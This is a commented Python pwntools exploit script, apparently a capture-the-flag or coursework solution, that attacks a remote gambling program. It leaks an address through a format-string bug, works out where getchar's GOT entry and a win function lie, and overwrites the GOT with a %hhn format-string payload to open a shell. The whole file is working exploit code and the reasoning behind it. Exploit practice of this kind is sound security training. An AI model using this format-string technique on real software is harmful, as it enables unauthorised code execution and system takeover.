#!/usr/bin/env python3
from pwn import *

# Before creating the script:

# Looking in binary ninja, there is a win function at 0xab4. However, if we run
# gdb with the program and use the command checksec, it shows PIE is enabled (we can
# also use the gdb command pie to determine the offest being used). Hence, since the 
# win function is in the text/code region, its address will change each time we run, 
# so we can't hardcode the address into our script. Instead, we need to leak an 
# address, and then access the win function relative to this address.

# When running the program, there are many different functions that can be called.
# To try and find a format string vulnerability, I tried entering the string 
# AAAA.%p.%p.%p.%p.%p as input for my name (note I did a '.' rather than a space so it 
# doesn't strip the %p's from my name), and then looked for a call to printf that 
# would display this format string. 

# I eventually found this in the gamble function, which if you gamble correctly
# prints your name with a vulnerable printf, displaying 
# AAAA.0x565ee734.0x100.0x565ec56d.0xff8c3140.0x41414141. Hence, if we look at the
# first 4 byte segment, this is an address in the text/code region, so we have now
# leaked an address we can use to create our offsets. Also note our input AAAA is
# held in offset 5 as 41414141, so we know where our buffer is stored.
 
# To jump to the win function, we need to overwrite the address of another function 
# that is called. When looking at do_gamble in binary ninja, we can see after this 
# printf call, the next function call is puts. However, the win function also uses 
# puts, so we can't overwrite this. The next is getchar, so we will attempt to 
# overwrite this.

# To find the address of getchar stored in the GOT, we can attach our script
# to gdb and command got, which displays the address 0x565c252c holds the address
# for getchar (in this instance). We can than compare this to the leaked address
# 0x565c2734, and calculating 0x565c2734 - 0x565c252c = 520, so we now know the
# offset from the leaked address to the getchar entry in the GOT is 520.

# Hence, we are going to want to create a payload which overwrites the address 
# 520 bytes before the leaked address with the address of the win function, which
# using 'x win' in gdb is at 0x565bfab4 (in this instance), giving an offset of
# 0x565c2734 - 0x565bfab4 = 11392 from the leaked address.

# The script:
p = remote("plsdonthaq.me", 4004)

# When the program asks us for our name, we input our first payload such that it
# will print the first 5 addresses on the stack.
p.sendline(b"AAAA.%p.%p.%p.%p.%p")

# Next, to get printf to be called with this payload we just sent, we need to gamble
# successfully. To do so, we enter a loop where we bet the minimum amount and keep
# going until our bet was correct.
while True:
  p.sendline("g")
  p.sendline("0.001")
  p.sendline("1")
  
  p.recvuntil("5)")
  p.recvlines(2)
  gamble = p.recvline()

  p.sendline("")

  if gamble[:5] != b"Wrong":
    break

# After a successful bet, it calls printf with our format string payload, so we can
# extract the leaked address from the output.
address = int(gamble[16:26], 0)

# Given this leaked address, we calculate the address of the GOT's getchar entry, as
# well as the address of the win function using offsets found earlier.
getcharGOT = address - 520
win = address - 11392

# Since the address of the win function changes each time we run, we cannot hardcode
# into the payload. Hence, we want to first extract each byte segment from it. Also
# since the system is little endian, we are going to write them with the least
# significant byte first. We also need to add the 0x to the front of the string so
# python treats it as an address. Finally we convert these addresses to their decimal
# values so we can use it in our payload.
win1 = int('0x' + str(hex(win))[8:10], 0)
win2 = int('0x' + str(hex(win))[6:8], 0)
win3 = int('0x' + str(hex(win))[4:6], 0)
win4 = int('0x' + str(hex(win))[2:4], 0)

# We then create a helper function which given a byte we want to write and the number
# of bytes we have already written, returns how many bytes we want to write next.
def getBytes(byte, current):
  # If we have already written more bytes than the next value we want to insert,
  # we need to utilise the overflow to get the correct value.
  if byte < current:
    byte = 256 - current + byte
  # Otherwise we just determine the offset required to reach our desired value.
  else:
    byte = byte - current
  return byte

# We then call this helper function for all four byte segments, and convert it into
# a string surrounded by the %x format.
win1amount = "%" + str(getBytes(win1, 16)) + "x"
win2amount = "%" + str(getBytes(win2, win1)) + "x"
win3amount = "%" + str(getBytes(win3, win2)) + "x"
win4amount = "%" + str(getBytes(win4, win3)) + "x"

# Now we simply need to construct our payload, which consists of the four addresses
# we want to write our byte values to, followed by our %x calls constructed earlier
# (note we have to use .encode() to ensure it is of type byte not string).
format_str = (
  p32(getcharGOT) + p32(getcharGOT + 1) + p32(getcharGOT + 2) + p32(getcharGOT + 3) +
  win1amount.encode() + b"%5$hhn" +
  win2amount.encode() + b"%6$hhn" +
  win3amount.encode() + b"%7$hhn" +
  win4amount.encode() + b"%8$hhn"
)

# To input this payload, we then call option c to change our name.
p.sendline("c")
p.sendline(format_str)

# Once our name is updated with the format string payload, we need to successfuly
# gamble again so printf is called on it.
while True:
  p.sendline("g")
  p.sendline("0.001")
  p.sendline("1")

  p.recvuntil("5)")
  p.recvlines(2)
  gamble = p.recvline()

  p.sendline("")

  if gamble[:5] != b"Wrong":
    break

# We should now jump to the win function and have shell access.
p.interactive()